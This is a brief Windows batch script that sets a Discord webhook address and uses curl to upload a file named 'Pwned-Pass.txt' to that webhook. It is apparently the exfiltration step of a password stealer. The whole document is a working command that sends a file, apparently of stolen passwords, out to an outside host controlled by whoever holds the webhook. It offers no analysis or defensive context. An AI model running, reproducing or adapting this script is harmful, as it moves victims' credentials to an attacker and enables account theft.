@echo off
set WEBHOOK_URL=https://discord.com/api/webhooks/1210083286651633684/0H191fHnoEMot2mgMajlW0GtgNaJSpfWDjl6IRSWkvx269lv3p5aU-Jt8kOFQB80VcuS
set FILE_PATH=Pwned-Pass.txt

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%FILE_PATH%" -F "content=Here's the file you requested: %FILE_PATH%" %WEBHOOK_URL%
